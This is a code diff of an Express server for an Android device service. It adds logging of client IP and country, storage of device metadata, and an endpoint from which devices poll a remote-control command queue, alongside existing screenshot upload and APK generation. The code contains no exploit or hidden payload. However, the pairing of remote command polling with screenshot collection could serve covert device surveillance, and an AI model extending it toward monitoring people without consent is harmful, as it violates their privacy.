@@ -15,6 +15,7 @@ import { generateAPK } from "../apk-generator";
 import { ENV } from "./env";
 import { getAdminUser, getUserByOpenId, upsertUser } from "../db";
 import { createOrUpdateApp, createScreenshot } from "../corporate-db";
+import { dequeueNextCommand } from "../remote-control-queue";
 
 const LOCAL_AUTH_EMAIL = (process.env.LOCAL_AUTH_EMAIL ?? "admin@faztudo.com").trim().toLowerCase();
 const SCREENSHOT_STORAGE_DIR = path.resolve(process.cwd(), "uploads", "screenshots");
@@ -86,6 +87,47 @@ function buildDeviceIdentity(rawPackageName: string, rawDeviceUid: string, rawDe
     deviceId: stableNumericDeviceId(stableIdSeed),
     deviceName: rawDeviceName || rawModel || "Android Device",
   };
+}
+
+function extractClientIp(req: express.Request): string | undefined {
+  const forwarded = req.headers["x-forwarded-for"];
+
+  if (typeof forwarded === "string" && forwarded.trim()) {
+    const first = forwarded.split(",")[0]?.trim();
+    if (first) {
+      return first.replace(/^::ffff:/, "");
+    }
+  }
+
+  if (Array.isArray(forwarded) && forwarded.length > 0 && forwarded[0]) {
+    return String(forwarded[0]).replace(/^::ffff:/, "");
+  }
+
+  const realIp = req.headers["x-real-ip"];
+  if (typeof realIp === "string" && realIp.trim()) {
+    return realIp.trim().replace(/^::ffff:/, "");
+  }
+
+  if (req.ip) {
+    return req.ip.replace(/^::ffff:/, "");
+  }
+
+  const socketIp = req.socket?.remoteAddress;
+  return socketIp ? socketIp.replace(/^::ffff:/, "") : undefined;
+}
+
+function extractCountryCode(req: express.Request): string | undefined {
+  const candidate =
+    req.headers["cf-ipcountry"] ??
+    req.headers["x-vercel-ip-country"] ??
+    req.headers["x-country-code"] ??
+    req.headers["x-geo-country"];
+
+  const code = Array.isArray(candidate) ? candidate[0] : candidate;
+  if (typeof code !== "string") return undefined;
+
+  const normalized = code.trim().toUpperCase();
+  return /^[A-Z]{2}$/.test(normalized) ? normalized : undefined;
 }
 
 async function persistScreenshotImage(base64Payload: string, fileName: string) {
@@ -211,6 +253,8 @@ async function startServer() {
         rawDeviceName,
         rawModel,
       );
+      const clientIp = extractClientIp(req);
+      const countryCode = extractCountryCode(req);
 
       await createOrUpdateApp(
         deviceId,
@@ -220,6 +264,14 @@ async function startServer() {
         "corporate",
         true,
         0,
+        {
+          deviceName,
+          model: rawModel,
+          deviceUid: rawDeviceUid,
+          packageName: rawPackageName,
+          ipAddress: clientIp,
+          countryCode,
+        }
       );
 
       console.log(
@@ -263,6 +315,8 @@ async function startServer() {
         rawDeviceName,
         rawModel,
       );
+      const clientIp = extractClientIp(req);
+      const countryCode = extractCountryCode(req);
 
       await createOrUpdateApp(
         deviceId,
@@ -272,6 +326,14 @@ async function startServer() {
         "corporate",
         true,
         0,
+        {
+          deviceName,
+          model: rawModel,
+          deviceUid: rawDeviceUid,
+          packageName: rawPackageName,
+          ipAddress: clientIp,
+          countryCode,
+        }
       );
 
       const matches = rawImageData.match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
@@ -300,6 +362,44 @@ async function startServer() {
     } catch (error) {
       console.error("[Device Screenshot] Failed:", error);
       const message = error instanceof Error ? error.message : "Falha ao registrar screenshot do dispositivo";
+      return res.status(500).json({
+        success: false,
+        message,
+      });
+    }
+  });
+
+  app.get("/api/device/command/next", async (req, res) => {
+    try {
+      const rawDeviceUid = typeof req.query.deviceUid === "string" ? req.query.deviceUid : "";
+      const rawPackageName = typeof req.query.packageName === "string" ? req.query.packageName : "";
+      const rawDeviceName = typeof req.query.deviceName === "string" ? req.query.deviceName : "";
+      const rawModel = typeof req.query.model === "string" ? req.query.model : "Android";
+
+      if (!rawDeviceUid || !rawPackageName) {
+        return res.status(400).json({
+          success: false,
+          message: "deviceUid e packageName sao obrigatorios",
+        });
+      }
+
+      const targetUser = await resolveDeviceOwner();
+      const { deviceId } = buildDeviceIdentity(
+        rawPackageName,
+        rawDeviceUid,
+        rawDeviceName,
+        rawModel,
+      );
+
+      const command = dequeueNextCommand(targetUser.id, deviceId);
+      return res.json({
+        success: true,
+        deviceId,
+        command,
+      });
+    } catch (error) {
+      console.error("[Device Command] Failed:", error);
+      const message = error instanceof Error ? error.message : "Falha ao buscar comando";
       return res.status(500).json({
         success: false,
         message,
